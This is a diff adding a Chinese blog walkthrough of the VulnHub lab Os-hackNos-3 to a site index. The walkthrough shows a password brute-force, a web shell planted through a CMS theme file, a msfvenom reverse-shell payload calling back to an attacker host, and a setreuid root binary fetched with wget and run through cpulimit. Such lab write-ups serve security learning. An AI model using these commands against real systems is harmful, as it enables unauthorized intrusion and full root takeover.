@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>vulnhub靶场Os-hackNos-3</title>
+      <link href="/2022/11/13/toc-heading-13/"/>
+      <url>/2022/11/13/toc-heading-13/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr><p>难度：中级<br>flag：2 个flag第一个用户和第二个root<br>学习：Web 应用程序|枚举|权限提升<br>网站： <a href="http://www.hacknos.com/">www.hacknos.com</a><br>联系我们 ： @rahul_gehlaut</p><hr><h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr><p><a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/">https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/</a></p><hr><h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>sudo netdiscover -r 192.168.1.0/24</code></p><p><img src="https://cdnjson.com/images/2022/11/13/1.png" alt="探测存活主机"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -Pn -A -p 1-65535 192.168.1.100</code></p><p><img src="https://cdnjson.com/images/2022/11/13/2.png" alt="端口扫描"></p><p>访问网站，发现页面下方有提示</p><p><img src="https://cdnjson.com/images/2022/11/13/3.png" alt="网站"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>对websec目录下再进行扫描，发现网站后台，访问之后发现账号是邮箱格式的，在目录扫描结果中发现有1.sql文件，尝试访问。</p><p><img src="https://cdnjson.com/images/2022/11/13/4.png" alt="目录扫描"></p><p>发现存在一个邮箱</p><p><img src="https://cdnjson.com/images/2022/11/13/5.png" alt="email"></p><h4 id="使用hydra爆破后台密码"><a href="#使用hydra爆破后台密码" class="headerlink" title="使用hydra爆破后台密码"></a>使用hydra爆破后台密码</h4><p>爆破之前，先用cewl对网站进行爬取，从而生成密码字典</p><blockquote><p>这里不能使用burpsuite进行抓包爆破。</p></blockquote><p><img src="https://cdnjson.com/images/2022/11/13/6.png" alt="hydra"></p><hr><h3 id="0x003-修改主题文件getshell"><a href="#0x003-修改主题文件getshell" class="headerlink" title="0x003 修改主题文件getshell"></a>0x003 修改主题文件getshell</h3><hr><p>使用账号密码登陆网站后台</p><p><img src="https://cdnjson.com/images/2022/11/13/7.png" alt="后台主页"></p><p><img src="https://cdnjson.com/images/2022/11/13/8.png" alt="主题文件"></p><p>访问 <a href="http://192.168.1.100/websec/themes/gila-blog/shell.php">http://192.168.1.100/websec/themes/gila-blog/shell.php</a> ，发现拒绝访问。</p><p>查看发现.htaccess文件拒绝访问.php后缀的文件，把.htaccess文件内容清除即可。</p><p><img src="https://cdnjson.com/images/2022/11/13/9.png" alt="htaccess"></p><p>使用蚁剑连接，成功上线。</p><p><img src="https://cdnjson.com/images/2022/11/13/10.png" alt="蚁剑"></p><h4 id="利用蚁剑上线msf"><a href="#利用蚁剑上线msf" class="headerlink" title="利用蚁剑上线msf"></a>利用蚁剑上线msf</h4><p>先使用命令生成一个elf文件，并将其通过蚁剑上传到目标服务器</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=7777 -f elf -o reverse.elf</code></p><p>然后kali上开启msfconsole监听，成功上线</p><p>切换交互式shell。</p><p><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></p><p><img src="https://cdnjson.com/images/2022/11/13/14.png" alt="msfconsole"></p><hr><h3 id="0x004-利用cpulimit提权"><a href="#0x004-利用cpulimit提权" class="headerlink" title="0x004 利用cpulimit提权"></a>0x004 利用cpulimit提权</h3><hr><p>利用如下命令查找具有suid权限的命令</p><p><code>find /bin/bash -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="https://cdnjson.com/images/2022/11/13/11.png" alt="find"></p><p>通过网站 <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 可以查看命令的详细使用方法。</p><p><img src="https://cdnjson.com/images/2022/11/13/123e6e63eb407e6a6e.png" alt="cpulimit"></p><p>先写一个 test.c 文件，然后进行编译</p><blockquote><p>这里尽量使用低版本进行编译，kali 2022版本编译的文件会导致提权失败。。。</p></blockquote><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc,char *argv[]){    setreuid(0,0);    execve("/bin/bash",NULL,NULL);}</code></pre><p>编译为可执行文件</p><p><code>gcc test.c -o exp</code></p><p>利用如下命令下载到服务器，然后使用cpulimit命令进行提权</p><p><code>wget http://192.168.1.105/exp</code></p><p><img src="https://cdnjson.com/images/2022/11/13/15.png" alt="cpulimit"></p><hr><h3 id="0x005-查找flag"><a href="#0x005-查找flag" class="headerlink" title="0x005 查找flag"></a>0x005 查找flag</h3><hr><p>还是老地方，用户目录下的user.txt和root目录下的root.txt</p><p><img src="https://cdnjson.com/images/2022/11/13/16.png" alt="flag"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web Security </tag>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>vulnhub靶场Os-hackNos-2</title>
       <link href="/2022/11/11/toc-heading-12/"/>
       <url>/2022/11/11/toc-heading-12/</url>
